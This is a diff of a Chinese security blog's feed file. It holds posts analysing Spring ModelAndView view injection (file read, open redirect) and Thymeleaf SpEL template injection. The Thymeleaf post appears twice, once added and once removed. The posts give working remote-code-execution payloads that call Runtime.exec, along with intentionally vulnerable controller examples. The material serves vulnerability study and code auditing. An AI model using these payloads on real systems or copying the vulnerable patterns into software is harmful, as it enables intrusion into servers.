+<p><img src="/2020/06/13/Spring_ModelAndView_Injection/500_error.png" alt="500_error"></p>
+<p>除了文件读取，当然也能进行一些权限认证的绕过，这需要考虑具体的代码场景，不一定通用。</p>
+<p>不过实际项目代码中多了<code>RedirectView()</code>方法变成以下情形：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAndViewTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@GetMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(@RequestParam(value = <span class="string">"url"</span>)</span>String url) </span>&#123;</span><br><span class="line">		String nextUrl = url;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> RedirectView(url));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>RedirectView</code>会触发302跳转的结果，等效于使用<code>url=redirect:/WEB-INF/web.xml</code></p>
+<p><img src="/2020/06/13/Spring_ModelAndView_Injection/redirectview_web_xml.png" alt="redirectview_web.xml"></p>
+<p>虽然存在<code>RedirectView</code>不能直接读取文件，但能利用302跳转这一特性，实现URL重定向</p>
+<p><img src="/2020/06/13/Spring_ModelAndView_Injection/open_redirect.png" alt="open_redirect"></p>
+<p>302跳转处回显了我们的输入，那么能进行CRLF注入吗？</p>
+<p>答案是不能，Spring会将\r\n进行处理，转换成空格。在下图的请求中可以看到<code>%0d</code>和<code>%0a</code>被转换成<code>\x20</code></p>
+<p><img src="/2020/06/13/Spring_ModelAndView_Injection/redirect_crlf.png" alt="CRLF"></p>
+<h1 id="3-分析"><a href="#3-分析" class="headerlink" title="3. 分析"></a>3. 分析</h1><p><code>/spring-framework/spring-webmvc/src/main/java/org/springframework/web/servlet/view/UrlBasedViewResolver.java:468</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> View <span class="title">createView</span><span class="params">(String viewName, Locale locale)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="comment">// If this resolver is not supposed to handle the given view,</span></span><br><span class="line">	<span class="comment">// return null to pass on to the next resolver in the chain.</span></span><br><span class="line">	<span class="keyword">if</span> (!canHandle(viewName, locale)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Check for special "redirect:" prefix.</span></span><br><span class="line">	<span class="keyword">if</span> (viewName.startsWith(REDIRECT_URL_PREFIX)) &#123;</span><br><span class="line">		String redirectUrl = viewName.substring(REDIRECT_URL_PREFIX.length());</span><br><span class="line">		RedirectView view = <span class="keyword">new</span> RedirectView(redirectUrl,</span><br><span class="line">			isRedirectContextRelative(), isRedirectHttp10Compatible());</span><br><span class="line">		String[] hosts = getRedirectHosts();</span><br><span class="line">		<span class="keyword">if</span> (hosts != <span class="keyword">null</span>) &#123;</span><br><span class="line">			view.setHosts(hosts);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> applyLifecycleMethods(REDIRECT_URL_PREFIX, view);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Check for special "forward:" prefix.</span></span><br><span class="line">	<span class="keyword">if</span> (viewName.startsWith(FORWARD_URL_PREFIX)) &#123;</span><br><span class="line">		String forwardUrl = viewName.substring(FORWARD_URL_PREFIX.length());</span><br><span class="line">		InternalResourceView view = <span class="keyword">new</span> InternalResourceView(forwardUrl);</span><br><span class="line">		<span class="keyword">return</span> applyLifecycleMethods(FORWARD_URL_PREFIX, view);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Else fall back to superclass implementation: calling loadView.</span></span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">super</span>.createView(viewName, locale);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可以看到，存在三种<code>viewName</code>的处理方法：</p>
+<ol>
+<li>以<code>redirect:</code>为前缀</li>
+<li>以<code>forward:</code>为前缀</li>
+<li>没有前缀</li>
+</ol>
+<h2 id="3-1-以redirect为前缀"><a href="#3-1-以redirect为前缀" class="headerlink" title="3.1 以redirect为前缀"></a>3.1 以redirect为前缀</h2><p>新建一个<code>RedirectView</code>对象，表现结果是根据视图名进行302跳转，返回包中的<code>Location</code>头为<code>redirectUrl</code>变量。</p>
+<p><img src="/2020/06/13/Spring_ModelAndView_Injection/redirect_web_xml.png" alt="redirect_web.xml"></p>
+<h2 id="3-2-以forward为前缀"><a href="#3-2-以forward为前缀" class="headerlink" title="3.2 以forward为前缀"></a>3.2 以forward为前缀</h2><p>新建一个<code>InternalResourceView</code>对象，根据视图名到指定的位置获取视图模板</p>
+<p>在spring的配置文件中，会存在如下的视图解析器配置</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>InternalResourceView</code>对象会受到该视图解析器配置的影响。</p>
+<p><code>InternalResourceViewResolver</code>会把返回的视图名称都解析为<code>InternalResourceView</code>对象，<code>InternalResourceView</code>会把Controller处理器方法返回的模型属性都存放到对应的<code>request</code>属性中，然后通过<code>RequestDispatcher</code>在服务器端把请求forword重定向到目标URL。比如在<code>InternalResourceViewResolver</code>中定义了<code>prefix=/WEB-INF/</code>，<code>suffix=.jsp</code>，然后请求的Controller处理器方法返回的视图名称为<code>test</code>，那么这个时候<code>InternalResourceViewResolver</code>就会把<code>test</code>解析为一个<code>InternalResourceView</code>对象，先把返回的模型属性都存放到对应的<code>HttpServletRequest</code>属性中，然后利用<code>RequestDispatcher</code>在服务器端把请求forword到<code>/WEB-INF/test.jsp</code>。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/"</span>/&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>/spring-framework/spring-webmvc/src/main/java/org/springframework/web/servlet/view/UrlBasedViewResolver.java:549</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> AbstractUrlBasedView <span class="title">buildView</span><span class="params">(String viewName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	Class&lt;?&gt; viewClass = getViewClass();</span><br><span class="line">	Assert.state(viewClass != <span class="keyword">null</span>, <span class="string">"No view class"</span>);</span><br><span class="line"></span><br><span class="line">	AbstractUrlBasedView view = (AbstractUrlBasedView) BeanUtils.instantiateClass(viewClass);</span><br><span class="line">	view.setUrl(getPrefix() + viewName + getSuffix());</span><br><span class="line">	view.setAttributesMap(getAttributesMap());</span><br><span class="line"></span><br><span class="line">	...</span><br></pre></td></tr></table></figure>
+
+<p><code>view.setUrl(getPrefix() + viewName + getSuffix())</code>会将前缀后缀拼接到<code>view</code>中，会导致可访问的文件有限（此时的前缀后缀是配置文件中的<code>prefix</code>和<code>suffix</code>，不是传入时的<code>forward:</code>）。</p>
+<h2 id="3-3-没有前缀"><a href="#3-3-没有前缀" class="headerlink" title="3.3 没有前缀"></a>3.3 没有前缀</h2><p>则调用<code>super.createView()</code>方法，等效于用户直接访问<code>viewName</code>。</p>
+<p><code>/spring-framework/spring-webmvc/src/main/java/org/springframework/web/servlet/view/AbstractCachingViewResolver.java:274</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> View <span class="title">createView</span><span class="params">(String viewName, Locale locale)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> loadView(viewName, locale);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h1><p><code>Spring ModelView Injection</code>有以下几种利用方式：</p>
+<ol>
+<li>web目录下的文件读取，但存在一定的限制（<code>InternalResourceViewResolver</code>中前后缀的配置）</li>
+<li>权限认证绕过</li>
+<li>重定向</li>
+</ol>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf" target="_blank" rel="noopener">https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf</a></p>
+<p><a href="http://johnis.online/old/2018/09/18/spring-view-injection/" target="_blank" rel="noopener">http://johnis.online/old/2018/09/18/spring-view-injection/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Spring Thymeleaf模版注入</title>
+    <url>/2020/09/05/Spring_Thymeleaf_View_Manipulation/</url>
+    <content><![CDATA[<h2 id="Thymeleaf介绍"><a href="#Thymeleaf介绍" class="headerlink" title="Thymeleaf介绍"></a>Thymeleaf介绍</h2><p> Thymeleaf 是一个跟 Velocity、FreeMarker 类似的模板引擎，它可以完全替代 JSP 。相较与其他的模板引擎，它有如下三个极吸引人的特点：</p>
+<ol>
+<li><p>Thymeleaf 在有网络和无网络的环境下皆可运行，即它可以让美工在浏览器查看页面的静态效果，也可以让程序员在服务器查看带数据的动态页面效果。这是由于它支持 html 原型，然后在 html 标签里增加额外的属性来达到模板+数据的展示方式。浏览器解释 html 时会忽略未定义的标签属性，所以 thymeleaf 的模板可以静态地运行；当有数据返回到页面时，Thymeleaf 标签会动态地替换掉静态内容，使页面动态显示。</p>
+</li>
+<li><p>Thymeleaf 开箱即用的特性。它提供标准和spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改jstl、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。</p>
+</li>
+<li><p>Thymeleaf 提供spring标准方言和一个与 SpringMVC 完美集成的可选模块，可以快速的实现表单绑定、属性编辑器、国际化等功能。</p>
+</li>
+</ol>
+<a id="more"></a>
+
+<h2 id="Thymeleaf模版注入"><a href="#Thymeleaf模版注入" class="headerlink" title="Thymeleaf模版注入"></a>Thymeleaf模版注入</h2><p><a href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java" target="_blank" rel="noopener">Spring ThymeleafView</a>会使用表达式解析模版名称，若是将用户输入的参数拼接到模版路径中，可以造成表达式注入。</p>
+<p>以下是漏洞案例代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/path"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">path</span><span class="params">(@RequestParam String lang)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"user/"</span> + lang + <span class="string">"/welcome"</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/fragment"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">fragment</span><span class="params">(@RequestParam String section)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"welcome :: "</span> + section; <span class="comment">//fragment is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>漏洞复现：</p>
+<p><img src="/2020/09/05/Spring_Thymeleaf_View_Manipulation/path-request.png" alt="path-request"></p>
+<br>
+
+<p>先来看payload: <code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x</code></p>
+<p>其中new了一个<code>java.util.Scanner</code>对象，用于读取字符。传入Scanner中的参数为<code>T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()</code>。</p>
+<p><code>T( )</code>用于访问类作用域的方法和常量，具体可见<a href="http://itmyhome.com/spring/expressions.html#expressions-types" target="_blank" rel="noopener">这里</a></p>
+<blockquote>
+<p><code>java.util.Scanner</code>是可以省略的，它在此仅用于回显，无需回显时直接<code>T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)</code>执行命令即可。</p>
+</blockquote>
+<p><code>::</code>在此为必须，不然不会进入表达式解析过程，并且一定得在表达式后面。</p>
+<p><code>.x</code>在此处可忽略（<code>return &quot;user/&quot; + lang + &quot;/welcome&quot;;</code>）</p>
+<br>
+
+<p>解析路径的代码在<a href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java#L277" target="_blank" rel="noopener">ThymeleafView:277</a>，其中<code>viewTemplateName</code>中一定要包含<code>::</code>，不然不会进入表达式解析过程。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!viewTemplateName.contains(<span class="string">"::"</span>)) &#123;</span><br><span class="line">    <span class="comment">// No fragment specified at the template name</span></span><br><span class="line"></span><br><span class="line">    templateName = viewTemplateName;</span><br><span class="line">    markupSelectors = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Template name contains a fragment name, so we should parse it as such</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> FragmentExpression fragmentExpression;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// By parsing it as a standard expression, we might profit from the expression cache</span></span><br><span class="line">        fragmentExpression = (FragmentExpression) parser.parseExpression(context, <span class="string">"~&#123;"</span> + viewTemplateName + <span class="string">"&#125;"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> TemplateProcessingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid template name specification: '"</span> + viewTemplateName + <span class="string">"'"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进<code>parser.parseExpression</code>方法，在<a href="https://github.com/thymeleaf/thymeleaf/blob/thymeleaf-3.0.11.RELEASE/src/main/java/org/thymeleaf/standard/expression/StandardExpressionParser.java#L113" target="_blank" rel="noopener">StandardExpressionParser</a>中对<code>~{viewTemplateName}~</code>进行处理</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String preprocessedInput =</span><br><span class="line">    (preprocess? StandardExpressionPreprocessor.preprocess(context, input) : input);</span><br></pre></td></tr></table></figure>
+
+<p>继续跟进<code>StandardExpressionPreprocessor.preprocess</code>，在<a href="https://github.com/thymeleaf/thymeleaf/blob/thymeleaf-3.0.11.RELEASE/src/main/java/org/thymeleaf/standard/expression/StandardExpressionPreprocessor.java#L80" target="_blank" rel="noopener">StandardExpressionPreprocessor</a>中，使用正则表达式将路径中的表达式提取出来。其中正则规则：<code>\_\_(.*?)\_\_</code>（表示非贪婪匹配两个<code>__</code>之间的内容），匹配得到<code>${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}</code></p>
+<p><img src="/2020/09/05/Spring_Thymeleaf_View_Manipulation/debug-preprocess.png" alt="debug-preprocess"></p>
+<p>提取表达式之后就是根据框架进行对应的表达式解析，这里是Spring所以用的就是SpringEL表达式解析。</p>
+<br>
+
+<br>
+
+<p>另一种情况，方法返回类型为<code>void</code>（必须为void），此时才会从URI中获取viewname。这种情况比较隐蔽，代码审计时容易忽略。表达式的解析过程是和上面一模一样。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/doc/&#123;document&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getDocument</span><span class="params">(@PathVariable String document)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">"Retrieving "</span> + document);</span><br><span class="line">    <span class="comment">//returns void, so view name is taken from URI</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>作者给出的payload: <code>__${T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;)}__::.x</code></p>
+<p>和之前的payload相比，少了<code>java.util.Scanner</code>，直接进行命令执行，无回显。</p>
+<p>我在这里试了一下回显的payload，发现报错中没有<code>id</code>的执行结果</p>
+<p><img src="/2020/09/05/Spring_Thymeleaf_View_Manipulation/doc-request.png" alt="doc-request"></p>
+<p>动态调试分析，原因是Spring分配URI时会自动抹去后缀名，导致缺少了<code>.x</code>，无法正常回显。再加一个<code>.x</code>就能正常回显。若一个<code>.x</code>都不加，payload会被截成<code>__${T(java.lang.Runtime).getRuntime()</code>，导致命令执行失败。</p>
+<p><img src="/2020/09/05/Spring_Thymeleaf_View_Manipulation/doc-request2.png" alt="doc-request2"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞原理很简单，就是Thymeleaf的视图参数可进行表达式解析，若用户输入可控制视图参数，就会导致SpEL注入漏洞产生。</p>
+<p>漏洞细节点是payload的构造，需要添加<code>__</code>和<code>::</code>引导表达式解析。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/veracode-research/spring-view-manipulation" target="_blank" rel="noopener">https://github.com/veracode-research/spring-view-manipulation</a></p>
+<p><a href="http://itmyhome.com/spring/expressions.html#expressions-types" target="_blank" rel="noopener">http://itmyhome.com/spring/expressions.html#expressions-types</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Spring中请求URL找到相应Controller的过程</title>
     <url>/2020/08/22/Spring_URL2Controller/</url>
     <content><![CDATA[<p>我把Spring请求URL找到相应Controller的过程调试了一遍，在此记录该过程，属于个人记录，其中很可能存在某些不细致甚至错误的地方，还请见谅。</p>
@@ -1500,151 +1645,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Spring Thymeleaf模版注入</title>
-    <url>/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/</url>
-    <content><![CDATA[<h2 id="Thymeleaf介绍"><a href="#Thymeleaf介绍" class="headerlink" title="Thymeleaf介绍"></a>Thymeleaf介绍</h2><p> Thymeleaf 是一个跟 Velocity、FreeMarker 类似的模板引擎，它可以完全替代 JSP 。相较与其他的模板引擎，它有如下三个极吸引人的特点：</p>
-<ol>
-<li><p>Thymeleaf 在有网络和无网络的环境下皆可运行，即它可以让美工在浏览器查看页面的静态效果，也可以让程序员在服务器查看带数据的动态页面效果。这是由于它支持 html 原型，然后在 html 标签里增加额外的属性来达到模板+数据的展示方式。浏览器解释 html 时会忽略未定义的标签属性，所以 thymeleaf 的模板可以静态地运行；当有数据返回到页面时，Thymeleaf 标签会动态地替换掉静态内容，使页面动态显示。</p>
-</li>
-<li><p>Thymeleaf 开箱即用的特性。它提供标准和spring标准两种方言，可以直接套用模板实现JSTL、 OGNL表达式效果，避免每天套模板、改jstl、改标签的困扰。同时开发人员也可以扩展和创建自定义的方言。</p>
-</li>
-<li><p>Thymeleaf 提供spring标准方言和一个与 SpringMVC 完美集成的可选模块，可以快速的实现表单绑定、属性编辑器、国际化等功能。</p>
-</li>
-</ol>
-<a id="more"></a>
-
-<h2 id="Thymeleaf模版注入"><a href="#Thymeleaf模版注入" class="headerlink" title="Thymeleaf模版注入"></a>Thymeleaf模版注入</h2><p><a href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java" target="_blank" rel="noopener">Spring ThymeleafView</a>会使用表达式解析模版名称，若是将用户输入的参数拼接到模版路径中，可以造成表达式注入。</p>
-<p>以下是漏洞案例代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/path"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">path</span><span class="params">(@RequestParam String lang)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"user/"</span> + lang + <span class="string">"/welcome"</span>; <span class="comment">//template path is tainted</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/fragment"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">fragment</span><span class="params">(@RequestParam String section)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"welcome :: "</span> + section; <span class="comment">//fragment is tainted</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>漏洞复现：</p>
-<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/path-request.png" alt="path-request"></p>
-<br>
-
-<p>先来看payload: <code>__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}__::.x</code></p>
-<p>其中new了一个<code>java.util.Scanner</code>对象，用于读取字符。传入Scanner中的参数为<code>T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()</code>。</p>
-<p><code>T( )</code>用于访问类作用域的方法和常量，具体可见<a href="http://itmyhome.com/spring/expressions.html#expressions-types" target="_blank" rel="noopener">这里</a></p>
-<blockquote>
-<p><code>java.util.Scanner</code>是可以省略的，它在此仅用于回显，无需回显时直接<code>T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;)</code>执行命令即可。</p>
-</blockquote>
-<p><code>::</code>在此为必须，不然不会进入表达式解析过程，并且一定得在表达式后面。</p>
-<p><code>.x</code>在此处可忽略（<code>return &quot;user/&quot; + lang + &quot;/welcome&quot;;</code>）</p>
-<br>
-
-<p>解析路径的代码在<a href="https://github.com/thymeleaf/thymeleaf-spring/blob/74c4203bd5a2935ef5e571791c7f286e628b6c31/thymeleaf-spring3/src/main/java/org/thymeleaf/spring3/view/ThymeleafView.java#L277" target="_blank" rel="noopener">ThymeleafView:277</a>，其中<code>viewTemplateName</code>中一定要包含<code>::</code>，不然不会进入表达式解析过程。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!viewTemplateName.contains(<span class="string">"::"</span>)) &#123;</span><br><span class="line">    <span class="comment">// No fragment specified at the template name</span></span><br><span class="line"></span><br><span class="line">    templateName = viewTemplateName;</span><br><span class="line">    markupSelectors = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Template name contains a fragment name, so we should parse it as such</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> FragmentExpression fragmentExpression;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// By parsing it as a standard expression, we might profit from the expression cache</span></span><br><span class="line">        fragmentExpression = (FragmentExpression) parser.parseExpression(context, <span class="string">"~&#123;"</span> + viewTemplateName + <span class="string">"&#125;"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> TemplateProcessingException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Invalid template name specification: '"</span> + viewTemplateName + <span class="string">"'"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>跟进<code>parser.parseExpression</code>方法，在<a href="https://github.com/thymeleaf/thymeleaf/blob/thymeleaf-3.0.11.RELEASE/src/main/java/org/thymeleaf/standard/expression/StandardExpressionParser.java#L113" target="_blank" rel="noopener">StandardExpressionParser</a>中对<code>~{viewTemplateName}~</code>进行处理</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> String preprocessedInput =</span><br><span class="line">    (preprocess? StandardExpressionPreprocessor.preprocess(context, input) : input);</span><br></pre></td></tr></table></figure>
-
-<p>继续跟进<code>StandardExpressionPreprocessor.preprocess</code>，在<a href="https://github.com/thymeleaf/thymeleaf/blob/thymeleaf-3.0.11.RELEASE/src/main/java/org/thymeleaf/standard/expression/StandardExpressionPreprocessor.java#L80" target="_blank" rel="noopener">StandardExpressionPreprocessor</a>中，使用正则表达式将路径中的表达式提取出来。其中正则规则：<code>\_\_(.*?)\_\_</code>（表示非贪婪匹配两个<code>__</code>之间的内容），匹配得到<code>${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;id&quot;).getInputStream()).next()}</code></p>
-<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/debug-preprocess.png" alt="debug-preprocess"></p>
-<p>提取表达式之后就是根据框架进行对应的表达式解析，这里是Spring所以用的就是SpringEL表达式解析。</p>
-<br>
-
-<br>
-
-<p>另一种情况，方法返回类型为<code>void</code>（必须为void），此时才会从URI中获取viewname。这种情况比较隐蔽，代码审计时容易忽略。表达式的解析过程是和上面一模一样。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/doc/&#123;document&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getDocument</span><span class="params">(@PathVariable String document)</span> </span>&#123;</span><br><span class="line">    log.info(<span class="string">"Retrieving "</span> + document);</span><br><span class="line">    <span class="comment">//returns void, so view name is taken from URI</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>作者给出的payload: <code>__${T(java.lang.Runtime).getRuntime().exec(&quot;touch executed&quot;)}__::.x</code></p>
-<p>和之前的payload相比，少了<code>java.util.Scanner</code>，直接进行命令执行，无回显。</p>
-<p>我在这里试了一下回显的payload，发现报错中没有<code>id</code>的执行结果</p>
-<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/doc-request.png" alt="doc-request"></p>
-<p>动态调试分析，原因是Spring分配URI时会自动抹去后缀名，导致缺少了<code>.x</code>，无法正常回显。再加一个<code>.x</code>就能正常回显。若一个<code>.x</code>都不加，payload会被截成<code>__${T(java.lang.Runtime).getRuntime()</code>，导致命令执行失败。</p>
-<p><img src="/2020/09/05/Spring_Thymeleaf_View_%20Manipulation/doc-request2.png" alt="doc-request2"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞原理很简单，就是Thymeleaf的视图参数可进行表达式解析，若用户输入可控制视图参数，就会导致SpEL注入漏洞产生。</p>
-<p>漏洞细节点是payload的构造，需要添加<code>__</code>和<code>::</code>引导表达式解析。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/veracode-research/spring-view-manipulation" target="_blank" rel="noopener">https://github.com/veracode-research/spring-view-manipulation</a></p>
-<p><a href="http://itmyhome.com/spring/expressions.html#expressions-types" target="_blank" rel="noopener">http://itmyhome.com/spring/expressions.html#expressions-types</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>Spring ModelAndView 注入</title>
-    <url>/2020/06/13/Spring_ModelAndView_Injection/</url>
-    <content><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1. 介绍"></a>1. 介绍</h1><p>在代码审计时发现以下功能点，Checkmarx显示存在<code>Spring ModelView Injection</code>，是由<code>ModelAndView</code>中的参数可被用户控制导致。这个漏洞的历史还是比较久的，但之前没有碰到过，于是就自己搭建环境调试一番，动手学习一下利用方法。</p>
-<a id="more"></a>
-
-<p>源码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/menuitem"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> ModelAndView <span class="title">menuitem</span><span class="params">(HttpServletRequest req, HttpServletResponse req)</span> </span>&#123;</span><br><span class="line">	String url = <span class="keyword">this</span>.getParam(req, <span class="string">"url"</span>);</span><br><span class="line">	HttpSession session = req.getSession();</span><br><span class="line">	session.setAttribute(<span class="string">"menuitem.url"</span>,url);</span><br><span class="line">	String nextUrl = <span class="string">"xxx"</span> + url;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span> ModelAndView(<span class="keyword">new</span> RedirectView(nextUrl));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h1 id="2-实践"><a href="#2-实践" class="headerlink" title="2. 实践"></a>2. 实践</h1><p>首先自己搭建一下测试环境，在本地用此代码Demo进行漏洞验证，Springframework版本为<code>5.0.0.RELEASE</code>。</p>
